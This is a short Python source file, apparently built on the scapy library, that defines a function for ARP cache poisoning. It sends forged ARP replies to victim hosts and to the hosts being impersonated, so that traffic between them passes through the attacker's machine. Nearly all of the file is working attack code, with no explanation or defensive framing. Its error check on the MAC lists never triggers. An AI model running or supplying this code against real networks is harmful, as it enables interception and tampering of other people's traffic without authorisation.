from scapy.all import *
import Functions

def ARPPoisoning(ipVictim, ipToSpoof, networkID):
    macAttacker = get_if_hwaddr(networkID)
    macVictim = [Functions.retrieveMACAdress(ip, networkID) for ip in ipVictim]
    macSpoof = [Functions.retrieveMACAdress(ip, networkID) for ip in ipToSpoof]
    
    if macSpoof == None or macAttacker == None or macVictim == None:
        print("Error!")
        sys.exit()
        
    for i in range(0, len(ipVictim)):
        for j in range(0, len(ipToSpoof)):
            if ipVictim[i] != ipToSpoof[j]:
                victimPkt = Ether() / ARP()
                victimPkt[Ether].src = macAttacker
                victimPkt[ARP].hwsrc = macAttacker
                victimPkt[ARP].psrc = ipToSpoof[j]
                victimPkt[ARP].hwdst = macVictim[i]
                victimPkt[ARP].pdst = ipVictim[i]

                sendp(victimPkt, iface = networkID, verbose = 0)
                
                spoofPkt = Ether() / ARP()
                spoofPkt[Ether].src = macAttacker
                spoofPkt[ARP].hwsrc = macAttacker
                spoofPkt[ARP].psrc = ipVictim[i]
                spoofPkt[ARP].hwdst = macSpoof[j]
                spoofPkt[ARP].pdst = ipToSpoof[j]

                sendp(spoofPkt, iface = networkID, verbose = 0)